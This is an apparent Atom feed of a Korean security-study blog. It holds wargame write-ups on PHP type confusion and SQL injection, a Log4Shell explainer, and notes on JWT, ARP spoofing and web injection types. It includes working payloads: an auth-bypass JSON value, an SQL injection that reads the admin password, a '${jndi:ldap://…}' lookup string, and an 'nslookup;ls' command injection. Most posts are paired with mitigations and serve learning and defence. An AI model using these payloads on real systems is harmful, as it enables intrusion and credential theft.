<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-27T19:35:34+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<pre><code class="language-mermaild!">sequenceDiagram
</code></pre>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[오직 로컬에서만 되냐 젠장]]></summary></entry><entry><title type="html">[wargame.kr]php type confusion 문제</title><link href="http://localhost:4000/dreamhack/php_typeconfusion/" rel="alternate" type="text/html" title="[wargame.kr]php type confusion 문제" /><published>2023-08-27T00:00:00+09:00</published><updated>2023-08-27T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/php_typeconfusion</id><content type="html" xml:base="http://localhost:4000/dreamhack/php_typeconfusion/"><![CDATA[<h2 id="php-형-변환">PHP 형 변환</h2>
<ul>
  <li><a href="https://dreamhack.io/wargame/challenges/329">문제</a></li>
  <li>서로 비교할 때 비교 각 대상의 타입이 일치하지 않아 발생하는 취약점이다.</li>
  <li>php 의 <code class="language-plaintext highlighter-rouge">==</code> 을 이용하여 비교를 진행할 때 발생한다.</li>
  <li>json 로 입력을 받을 때 발생할 수 있다.</li>
</ul>

<h3 id="문제-분석">문제 분석</h3>
<ul>
  <li>json 형태로 입력을 받아 디코드 한다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$json</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'json'</span><span class="p">]);</span>
</code></pre></div></div>

<ul>
  <li>
    <p>json 형태로 넘겨줄 때 공격자는 타입을 정수형 또는 boolean 형 또는 string 형으로 넘겨줄 수 있다.</p>
  </li>
  <li>
    <p>현재 여기서 <code class="language-plaintext highlighter-rouge">==</code> 을 이용하여 두 개의 값이 같은지만을 확인한다.</p>
  </li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nv">$json</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">==</span> <span class="nv">$key</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>즉 자동으로 형 <code class="language-plaintext highlighter-rouge">$key</code> 값이 앞의 비교하는 형식으로 변환이 되는 취약점을 가지고 있다.</li>
</ul>

<h3 id="테스트">테스트</h3>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">==</span> <span class="s2">"dsf"</span><span class="p">){</span>
        <span class="k">echo</span> <span class="s2">"true"</span><span class="p">;</span>
<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"false"</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<ul>
  <li>true를 출력하는 것을 확인할 수 있다.<br /><img src="https://user-images.githubusercontent.com/31990118/263522608-064bd56d-02fe-47a1-9dd9-e66fcf4b79b7.png" alt="Pasted image 20230827192833" /></li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">==</span> <span class="s2">""</span><span class="p">){</span>
        <span class="k">echo</span> <span class="s2">"true"</span><span class="p">;</span>
<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"false"</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>false 를 출력하는 것을 확인할 수 있다.<br /><img src="https://user-images.githubusercontent.com/31990118/263522737-f1863132-0b67-47f0-9daa-7be5ecec854e.png" alt="Pasted image 20230827193102" /></p>
  </li>
  <li>
    <p>즉 <code class="language-plaintext highlighter-rouge">""</code> 아무것도 없을 때는 false 로 타입 변환이 일어나고 <code class="language-plaintext highlighter-rouge">"asdf"</code> 임의의 글자가 있을 때는 true 로 타입 변환이 되는 것을 확인할 수 있다.</p>
  </li>
</ul>

<h3 id="공격-페이로드">공격 페이로드</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>json={"key":true}

if($json-&gt;key == "xyz") 비교 하면
"xyz" =&gt; true 로 형 변환이 일어난다.
</code></pre></div></div>

<h3 id="대응-방안">대응 방안</h3>

<ul>
  <li>php 에서 두개의 값을 비교할 때 <code class="language-plaintext highlighter-rouge">==</code> 을 이용하여 값 만 비교하는 것이 아닌 <code class="language-plaintext highlighter-rouge">===</code> 을 사용하여 값과 타입을 모두 비교하도록 해주면 된다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://m.blog.naver.com/wnsdnakdhkd6/221976728186">php type confusion</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="php" /><category term="type confusion" /><summary type="html"><![CDATA[type confusion 을 통해 if 문 인증을 우회할 수 있다.]]></summary></entry><entry><title type="html">[wargame.kr]tmitter 문제</title><link href="http://localhost:4000/dreamhack/tmitter%EB%AC%B8%EC%A0%9C/" rel="alternate" type="text/html" title="[wargame.kr]tmitter 문제" /><published>2023-08-27T00:00:00+09:00</published><updated>2023-08-27T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/tmitter%EB%AC%B8%EC%A0%9C</id><content type="html" xml:base="http://localhost:4000/dreamhack/tmitter%EB%AC%B8%EC%A0%9C/"><![CDATA[<h2 id="sql-injection">SQL Injection</h2>
<ul>
  <li><a href="https://dreamhack.io/wargame/writeups/11825">문제</a></li>
</ul>

<h3 id="방법-1">방법 1.</h3>
<ul>
  <li>insert 문을 예측하여 admin 계정의 비밀번호를 얻어 주었다.</li>
  <li>union sql injection</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>test','1'),('key','name',(select ps from tmitter_user where id='admin'),'3')#
</code></pre></div></div>

<h3 id="방법-2">방법 2.</h3>
<ul>
  <li>아이디 검사 시스템의 허점을 이용하여 방법이다.</li>
  <li>서버에서 아이디의 최대 길이를 검사하지 않아 발생한 문제이다.</li>
  <li>로그인 방식을 예측하기.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select * from tmitter_user where id=아이디 and pw=비밀번호
</code></pre></div></div>

<ul>
  <li>
    <p>아이디 크기가 char(32) 이다. 따라서 회원 가입을 할 때 서버에서 아이디 길이를 따로 검사하지 않는다 따라서 아이디가 저장될 때 32 바이트 만을 저장한다. 그리고 mysql 에서 데이터를 저장할 때 공백을 생략하는 것 같다.</p>
  </li>
  <li>
    <p>회원가입</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id=admin++++++++++++++++++++++++++++++++++++1&amp;pw=1234567
</code></pre></div></div>

<ul>
  <li>두 개의 admin 계정이 생성되었다.</li>
  <li>원래 admin 계정과 현재 만든 admin 계정 두 개가 생성되어있다.</li>
  <li>후에 만든 admin 계정으로 로그인을 하면 원래 admin 계정으로 로그인 되는 것을 확인할 수 있다. 왜냐하면 db에 먼저 저장된 admin 이라는 id의 정보를 읽어오기 때문이다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://private.tistory.com/63">여러개 한번에 insert 하기</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="sqli" /><summary type="html"><![CDATA[tmitter 문제 풀이.]]></summary></entry><entry><title type="html">CVE-2021-44228 Log4shell 취약점에 대하여 알아보자.</title><link href="http://localhost:4000/log4shell%EC%B7%A8%EC%95%BD%EC%A0%90%EC%9D%B4%EB%A1%A0/" rel="alternate" type="text/html" title="CVE-2021-44228 Log4shell 취약점에 대하여 알아보자." /><published>2023-08-17T00:00:00+09:00</published><updated>2023-08-17T23:13:00+09:00</updated><id>http://localhost:4000/log4shell%EC%B7%A8%EC%95%BD%EC%A0%90%EC%9D%B4%EB%A1%A0</id><content type="html" xml:base="http://localhost:4000/log4shell%EC%B7%A8%EC%95%BD%EC%A0%90%EC%9D%B4%EB%A1%A0/"><![CDATA[<h2 id="cve-2021-44228-log4shell-취약점">CVE-2021-44228 Log4Shell 취약점</h2>

<h3 id="취약점-정보">취약점 정보</h3>
<ul>
  <li>Apache Log4j 의 JNDI(Java Naming and Directory Interface) Injection 취약점이다.</li>
  <li>영향을 받는 Apache Log4j 버전의 메세지에 신뢰할 수 없는 데이터(악성 페이로드)를 포함함으로써 공격자는 JNDI 조회를 악성 서버에 연결할 수 있다.</li>
  <li>RCE ( Remote Code Excution ) 즉 원격으로 악성 코드를 서버에서 실행시킬 수 있다.</li>
  <li>원격으로 악성 코드를 서버로 다운로드 및 실행 시키는 공격이다.</li>
</ul>

<h3 id="취약점-버전">취약점 버전</h3>
<ul>
  <li>Log4j2 &lt;= 2.14.1</li>
  <li>jdk version &lt; 6u211, 7u201, 8u191, 11.0.1</li>
</ul>

<h3 id="보안-취약점-원인">보안 취약점 원인</h3>
<h4 id="log4j의-message-lookup-기능과-lookups의-jndi-기능">Log4j의 Message Lookup 기능과 Lookups의 JNDI 기능</h4>
<ul>
  <li>Message Lookup 패턴 기능과 Lookup의 JNDI기능 때문에 발생하는 취약점이다.</li>
  <li>원래 서버 내부에서 운영중인 LDAP 서버에 접속하여 코드를 서버로 다운로드 및 실행시키는 기능이다.</li>
  <li>공격자는 이를 악용하여 공격자의 LDAP 서버에 접속하여 악성 코드를 서버로 다운로드 및 실행 시킨다.</li>
  <li>취약한 코드 예시. Message Lookup 기능과 Lookup의 JNDI 기능을 이용한 공격이다.</li>
  <li>공격자의 payload 가 log 메세지에 삽입되어 발생되는 공격이다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">log</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="s">"test "</span><span class="o">+</span><span class="s">"${jndi:ldap://공격자 서버}"</span><span class="o">);</span>
</code></pre></div></div>

<h3 id="jndi-란">JNDI 란?</h3>
<ul>
  <li>java 로 작성된 에플리케이션을 DNS, LDAP, RMI, NDS 등과 같은 Naming / Directory 서비스에 연결하기  위한 API 이다.</li>
</ul>

<h3 id="ldap-란">LDAP 란?</h3>
<ul>
  <li>Lightweight Directory Access Protocol 경량 디렉터리 엑세스 프로토콜.</li>
  <li>디렉터리 서비스를 조회하고 수정하는 응용 프로토콜(7계층)이다.</li>
</ul>

<h3 id="log4shell공격-payload">Log4Shell공격 Payload</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${jndi:ldap://공격자 서버}
</code></pre></div></div>

<h3 id="log4shell-공격-동작-방식">Log4Shell 공격 동작 방식</h3>
<ul>
  <li>공격자</li>
  <li>공격자 LDAP 서버</li>
  <li>공격자 HTTP 서버 : 악성 class 또는 jar 파일을 가지고 있는 곳이다.</li>
  <li>취약한 웹 서버 : 취약한 버전의 log4j 버전과 jdk 버전을 이용하고 있어야 한다.</li>
</ul>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOybuSDshJzrsoQgOiDqs7XqsqkgUGF5bG9hZCDsoITri6xcbuybuSDshJzrsoQgLT4-IOybuSDshJzrsoQgOiBwYXlsb2Fk66W8IOuhnOq5heydhCDsnITtlbQgbG9nNGrroZwg7J2R64u1IOuNsOydtO2EsCDsoITri6xcbuybuSDshJzrsoQgLT4-IOqzteqyqeyekCBMREFQIOyEnOuyhCA6IOyVheyEsSDrpqzrsoTsiqQg7ImYIO2MjOydvChjbGFzcyBvciBqYXIpIOychOy5mCDsoJXrs7Qg7JqU7LKtXG7qs7XqsqnsnpAgTERBUCDshJzrsoQgLT4-IOybuSDshJzrsoQgOiDslYXshLEg7YyM7J28IOydtOumhCDrsI8g7L2U65OcIOychOy5mCDsnZHri7VcbuybuSDshJzrsoQgLT4-IOqzteqyqeyekCBIVFRQIOyEnOuyhCA6IOyVheyEsSDtjIzsnbwg64uk7Jq066Gc65OcIOyalOyyrVxu6rO16rKp7J6QIEhUVFAg7ISc67KEIC0-PiDsm7kg7ISc67KEIDog7JWF7ISxIO2MjOydvCDsnZHri7VcbuybuSDshJzrsoQgLT4-IOybuSDshJzrsoQgOiDslYXshLEg7YyM7J28IOyLpO2WiVxu7Ju5IOyEnOuyhCAtPj4g6rO16rKp7J6QIDog66as67KE7IqkIOyJmOydhCDthrXtlZwg7Jew6rKwIiwibWVybWFpZCI6bnVsbH0" /></p>

<p><img src="https://user-images.githubusercontent.com/31990118/261207125-030bd82e-6262-4d7b-b52f-7e98a3fc6926.jpg" alt="log4j_attack" />
<a href="https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/assets/log4j_attack.png">출처 : govcert</a></p>

<h3 id="대응-방안">대응 방안</h3>
<ul>
  <li>Log4j 버전 2.10 ~ 2.14.1 을 사용할 때 대응방안.  Lookup 기능을 비활성화하기.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java
-Dlog4j2.formatMsgNoLookups=true
...
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/31990118/261207377-549f5838-50e7-4c54-b352-20f3d45d6a54.png" alt="Pasted image 20230803170827" /></p>

<ul>
  <li>
    <p>취약점이 해결된 Log4j 2.17 이상 버전 이용하기. 왜냐하면 2.16.0 버전에서 message lookup patterns 이 제거되었고, JNDI 기능이 디펄트로 비활성화 되어있기 때문이다.</p>
  </li>
  <li>
    <p>jdk 버전 6u211, 7u201, 8u191, 11.0.1 이상으로 이용하기.  취약한 버전의 Log4j 버전을 사용하더라도 ldap.object.trustURLCodebase 의 디펄트 값이 false이기 때문에 외부에서 악성 코드를 다운로드 하지 않는다. 즉 웹 서버의 log4j는 공격자 서버에서 jar 또는 class 파일을 다운로드 받고 실행시키지 않는다.</p>
  </li>
  <li>
    <p>Remote codebase 를 disable 하기. 신뢰하지 못하는 외부 서버로 부터 jar 코드를 무단으로 다운 및 실행하지 않게한는 설정이다.</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LDAP 기반 설정
com.sun.jndi.ldap.object.trustURLCodebase=false
6u211, 7u201, 8u191, 11.0.1 버전 이상부터 false 가 default이다.

RMI 기반 설정
com.sun.jndi.cosnaming.object.trustURLCodebase=false
8u121 부터 false가 default 이다.
</code></pre></div></div>

<h3 id="참고-사이트">참고 사이트</h3>
<ul>
  <li><a href="https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/">Log4Shell Update: Second log4j Vulnerability Published</a></li>
  <li><a href="https://blog.o3g.org/server/log4j-%EC%B7%A8%EC%95%BD%EC%A0%90-cve-2021-44228-%EC%9D%84-%EB%A7%89%EB%8A%94-5%EA%B0%80%EC%A7%80-%EB%B0%A9%EB%B2%95/">Log4j 취약점 (CVE-2021-44228) 을 막는 5가지 방법 (o3g.org)</a></li>
  <li><a href="https://www.trendmicro.com/ko_kr/what-is/apache-log4j-vulnerability.html">Apache Log4J(Log4Shell) 취약점이란? (trendmicro.com)</a></li>
  <li><a href="https://www.kisec.com/rsrh_rpt_det.do?id=783">한국정보보호교육센터 (kisec.com)</a></li>
  <li><a href="https://ko.wikipedia.org/wiki/LDAP">LDAP - 위키백과, 우리 모두의 백과사전 (wikipedia.org)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="java" /><category term="log4j" /><category term="log4shell" /><category term="CVE-2021-44228" /><category term="CVE" /><summary type="html"><![CDATA[Log4shell 취약점 무엇인지 정리해 보았다.]]></summary></entry><entry><title type="html">Log4j 직접 사용해보기</title><link href="http://localhost:4000/log4j%EC%82%AC%EC%9A%A9%ED%95%B4%EB%B3%B4%EA%B8%B0/" rel="alternate" type="text/html" title="Log4j 직접 사용해보기" /><published>2023-08-09T00:00:00+09:00</published><updated>2023-08-09T23:13:00+09:00</updated><id>http://localhost:4000/log4j%EC%82%AC%EC%9A%A9%ED%95%B4%EB%B3%B4%EA%B8%B0</id><content type="html" xml:base="http://localhost:4000/log4j%EC%82%AC%EC%9A%A9%ED%95%B4%EB%B3%B4%EA%B8%B0/"><![CDATA[<h2 id="log4j-란">Log4j 란</h2>
<ul>
  <li>컴퓨터가 언제, 무슨 일을 어떻게 했는지 남기는 도구이다.</li>
  <li>JAVA를 사용하여 Log를 남기는 도구이다.</li>
  <li>콘솔 및 파일출력 형태의 로깅을 지원한다.</li>
</ul>

<h2 id="log4j-실습">Log4j 실습</h2>

<ol>
  <li>먼저 버전에 맞는 log4j jar 파일을 <a href="https://archive.apache.org/dist/logging/log4j/">다운로드</a>하기. 여기서는 log4j-2.14.1 버전을 이용하여 실습을 진행하였다.</li>
  <li>여기서는 log4j-api-2.14.1.jar 과 log4j-core-2.14.1.jar 파일을 사용하여 테스트 하였다.</li>
  <li>테스트 자바 프로젝트 구조. bin 폴더에 컴파일이 완료된 class 파일이 들어간다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/32855c4e-c4c8-4cc0-93d9-ff7700ade6d9" alt="Pasted image 20230803151419" /></li>
  <li>테스트 코드.<br /><script src="https://gist.github.com/MinGyu2/d95d7a9d3bd8736dcb89b0cbbbc87c5e.js"></script></li>
  <li>컴파일 하기. 프로젝트 위치에서 아래의 명령어를 실행시켜 주면 된다. 그러면 bin/classes 폴더에 컴파일된 class 파일을 확인할 수 있다.<br /><script src="https://gist.github.com/MinGyu2/3a442c140c8e5a6ca60bbf9773153ab0.js"></script><img src="https://user-images.githubusercontent.com/31990118/259305662-d0c16f6f-6b29-4f5e-b4b5-2766c4937c78.png" alt="Pasted image 20230803153809" /></li>
  <li>
    <p>실행하기. 로그기록이 출력되는 것을 확인할 수 있다. 그리고 Lookup 기능의 동작을 확인할 수 있다.
<br /><script src="https://gist.github.com/MinGyu2/984a597d1105904eefb9330f8217ea53.js"></script><br /><img src="https://user-images.githubusercontent.com/31990118/259305774-677c9efa-e860-4ebd-97ef-8bcb97c41fbe.png" alt="Pasted image 20230803153939" /></p>
  </li>
  <li>메세지 LookUps 기능은 log4j 2.15.0 에서 디펄트로 꺼져있다. 그리고 이 기능은 log4j 2.16.0 (2.12.2, 2.12.3, 2.3.1)에서 완전히 제거되었다. log4j 2.19.0 으로 테스트 해보면 lookUp 기능이 동작안하는 것을 확인할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/e6932b91-3b8e-4dba-80c7-fe54f7f9a811" alt="Pasted image 20230809152136" /><br /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/fb24b755-ae59-4222-8a49-400989498151" alt="Pasted image 20230809152205" /></li>
</ol>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">NVD - CVE-2021-44228 (nist.gov)</a></li>
  <li><a href="https://logging.apache.org/log4j/2.x/release-notes/2.16.0.html">Log4j – (apache.org)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="java" /><category term="log4j" /><summary type="html"><![CDATA[Log4j가 무엇인지 정리하고, 직접 사용해 보았다.]]></summary></entry><entry><title type="html">IP주소와 MAC주소 간단한 정리</title><link href="http://localhost:4000/IPandMAC/" rel="alternate" type="text/html" title="IP주소와 MAC주소 간단한 정리" /><published>2023-07-28T00:00:00+09:00</published><updated>2023-07-28T23:13:00+09:00</updated><id>http://localhost:4000/IPandMAC</id><content type="html" xml:base="http://localhost:4000/IPandMAC/"><![CDATA[<h2 id="ip-주소">IP 주소</h2>
<ul>
  <li>Internet Protocol Address</li>
  <li>컴퓨터 네트워크에서 장치들이 서로 인식하고 통신을 하기위해 사용하는 특수한 번호이다.</li>
  <li>네트워크에서 장치들의 연결을 확인하기 위해 사용된다.</li>
</ul>

<h3 id="구조">구조</h3>
<ul>
  <li>IPv4 ( 4 byte ) : 192.168.1.1</li>
  <li>IPv6 ( 16 byte ) :  FFFF:F200:3204:0B00</li>
</ul>

<h3 id="사용되는-위치">사용되는 위치</h3>
<ul>
  <li>네트워크 계층( 3 계층 )</li>
</ul>

<h3 id="통신할-때">통신할 때</h3>
<ul>
  <li>라우터는 데이터를 전달할 때 IP 주소가 필요하다.</li>
</ul>

<h2 id="mac-주소">MAC 주소</h2>
<ul>
  <li>Media Access Control Address</li>
  <li>장치가 할당받은 오직 하나의 물리적 주소이다.</li>
  <li>장치의 물리적 주소를 보장하기 위해 사용된다.</li>
  <li>장치를 식별하는데 사용된다.</li>
</ul>

<h3 id="구조-1">구조</h3>
<ul>
  <li>6 byte 16진법 주소.</li>
  <li>구조 예시 : 00:FF:FF:AB:BB:AA</li>
</ul>

<h3 id="사용되는-위치-1">사용되는 위치</h3>
<ul>
  <li>데이터 링크 계층( 2 계층 )</li>
</ul>

<h3 id="통신할-때-1">통신할 때</h3>
<ul>
  <li>스위치는 데이터를 전달할 때 MAC 주소를 필요로 한다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://www.geeksforgeeks.org/difference-between-mac-address-and-ip-address/">Difference between MAC Address and IP Address - GeeksforGeeks</a></li>
  <li><a href="https://ko.wikipedia.org/wiki/IP_%EC%A3%BC%EC%86%8C">IP 주소 - 위키백과, 우리 모두의 백과사전 (wikipedia.org)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="IP addr" /><category term="MAC addr" /><summary type="html"><![CDATA[IP주소와 MAC주소에 대하여 정리해보자.]]></summary></entry><entry><title type="html">JWT 란?</title><link href="http://localhost:4000/JWT/" rel="alternate" type="text/html" title="JWT 란?" /><published>2023-07-21T00:00:00+09:00</published><updated>2023-07-21T23:13:00+09:00</updated><id>http://localhost:4000/JWT</id><content type="html" xml:base="http://localhost:4000/JWT/"><![CDATA[<h2 id="jwt-란">JWT 란?</h2>
<ul>
  <li>JSON Web Tokens</li>
  <li>세션 ID값을 대체할 수 있다.</li>
  <li>웹 표준을 따르기 때문에 대부분의 언어가 이를 지원한다.</li>
</ul>

<h2 id="구조">구조</h2>
<ul>
  <li><strong>Header.Payload.Signature</strong> 로 구성되어 있다.</li>
  <li>’.(dot)’을 구분자로 하여 JWT 토큰 1개를 만든다.</li>
</ul>

<h3 id="header">Header</h3>
<ul>
  <li>해시 알고리즘 유형</li>
</ul>

<h3 id="payload">Payload</h3>
<ul>
  <li>데이터 ( ex: { user:admin } )</li>
</ul>

<h3 id="signature">Signature</h3>
<ul>
  <li>무결성 검증을 위한것이다.</li>
  <li>즉 JWT 토큰이 변조되어 있는지 확인할 수 있다.</li>
  <li>비밀 키를 이용하여 해시 처리를 한다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Signature= 암호알고리즘(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  비밀 키.
)

JWT = Header.Payload.Signature
</code></pre></div></div>

<h2 id="단점">단점</h2>
<ul>
  <li>서버가 사용자 웹 브라우저에 너무 많은 정보를 전달할 위험이있다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="JWT" /><category term="HMAC" /><summary type="html"><![CDATA[JWT에 대하여 알아보자.]]></summary></entry><entry><title type="html">MITM 공격이란?</title><link href="http://localhost:4000/MITM%EA%B3%B5%EA%B2%A9/" rel="alternate" type="text/html" title="MITM 공격이란?" /><published>2023-07-14T00:00:00+09:00</published><updated>2023-07-14T23:13:00+09:00</updated><id>http://localhost:4000/MITM%EA%B3%B5%EA%B2%A9</id><content type="html" xml:base="http://localhost:4000/MITM%EA%B3%B5%EA%B2%A9/"><![CDATA[<h2 id="mitm">MITM</h2>
<ul>
  <li>Man In The Middle 공격(중간자 공격)</li>
  <li>공격자가 사용자와 웹 애플리케이션간의 데이터 흐름을 조작하여 데이터를 가로채는 공격이다.</li>
  <li>ARP Spoofing 공격을 이용하여 중간자 공격을 할 수 있는 환경을 만들수 있다.</li>
</ul>

<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0fff4871-528b-42db-8430-170edab4a8ef" alt="Pasted image 20230714155433" /></p>

<h2 id="arp">ARP</h2>
<ul>
  <li>Address Resolution Protocol (주소 결정 프로토콜)</li>
  <li>IP 주소를 물리적 네트워크 주소(MAC)로 대응시키기 위해 사용되는 프로토콜이다.</li>
  <li>IP 주소는 알지만 MAC 주소를 모를 때 MAC 주소를 알기 위해서 사용되는 프로토콜이다.</li>
</ul>

<h2 id="arp-spoofing">ARP Spoofing</h2>
<ul>
  <li>ARP 프로토콜을 이용한 MITM 공격이다.</li>
  <li>근거리 통신망에서만 사용할 수 있는 공격이다.</li>
  <li>사용자가 IP 주소에 대응하는 MAC 주소를 찾을 때 공격자가 해당 IP의 MAC주소는 자기라고 알리는 것이다. 즉 원래 IP에 대응하는 기기의 응답보다 빠르게 공격자가 자기 MAC주소를 알리는 것이다.</li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="MIMA" /><category term="ARP" /><category term="ARP Spoofing" /><summary type="html"><![CDATA[MITM 공격에 대하여 알아보자.]]></summary></entry><entry><title type="html">주통기반 Web 취약점 시나리오</title><link href="http://localhost:4000/%EC%A3%BC%ED%86%B5%EA%B8%B0%EB%B0%98%EA%B3%B5%EA%B2%A9%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4%EC%A0%95%EB%A6%AC/" rel="alternate" type="text/html" title="주통기반 Web 취약점 시나리오" /><published>2023-07-02T00:00:00+09:00</published><updated>2023-07-21T23:13:00+09:00</updated><id>http://localhost:4000/%EC%A3%BC%ED%86%B5%EA%B8%B0%EB%B0%98%EA%B3%B5%EA%B2%A9%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4%EC%A0%95%EB%A6%AC</id><content type="html" xml:base="http://localhost:4000/%EC%A3%BC%ED%86%B5%EA%B8%B0%EB%B0%98%EA%B3%B5%EA%B2%A9%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4%EC%A0%95%EB%A6%AC/"><![CDATA[<h2 id="3-ldap-인젝션">3. LDAP 인젝션</h2>

<h3 id="ldap">LDAP</h3>
<ul>
  <li>작은 DB 이다.</li>
  <li>간단한 로그인 인증에 사용된다.</li>
</ul>

<h3 id="취약점-시나리오">취약점 시나리오</h3>
<ul>
  <li>로그인 인증을 우회하기. 비인가 사용자가 시스템에 접속할 수 있습니다.</li>
</ul>

<h2 id="4-운영체제-명령어-실행">4. 운영체제 명령어 실행</h2>
<ul>
  <li>command injection</li>
  <li>예를 들어 nslookup ( DNS 에 도메인 정보를 요청 ) 명령을 내부적으로 수행하는 사이트가 있다고 하자. 도메인 검색 페이지에서 도메인 만을 입력하는 것이 아닌 그 다음의 명령을 이어 붙여 다음 명령을 수행시키는 공격이다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nslookup 도메인명;ls
</code></pre></div></div>

<h3 id="취약점-시나리오-1">취약점 시나리오</h3>
<ul>
  <li>서버에 악영향을 미치는 명령을 실행시킬 수 있다.</li>
</ul>

<h2 id="5-sql-injection">5. SQL Injection</h2>
<ul>
  <li>임의의 SQL 문을 삽입하는 공격이다.</li>
</ul>

<h3 id="취약점-시나리오-2">취약점 시나리오</h3>
<ul>
  <li>DB 에 저장된 정보를 탈취할 수 있다.</li>
  <li>인증을 우회할 수 있다.</li>
</ul>

<h2 id="6-ssi-injection">6. SSI Injection</h2>
<ul>
  <li>ssi(Server Side Include) 란 WAS(php, jsp) 가 나오기 전에 동적 페이지를 만들 때 사용되었다.</li>
  <li>ssi 로 만들어진 코드를 삽입하는 공격이다. 확장자는 shtml 이다. ssi 지시어를 실행시켜 발생하는 취약점이다.</li>
  <li>현재는 거의 없다.</li>
</ul>

<h3 id="취약점-시나리오-3">취약점 시나리오</h3>
<ul>
  <li>악의적인 커맨드 명령어를 실행시킬 수 있다.</li>
</ul>

<h2 id="7-xpath-injection">7. XPath Injection</h2>
<ul>
  <li>XML (Extensible Markup Language)의 xpath 에서 발생하는 오류이다.</li>
  <li>XML은 네트워크 통신을 할 때 쓰였지만 현재는 JSON 형태로 데이터를 전달한다.</li>
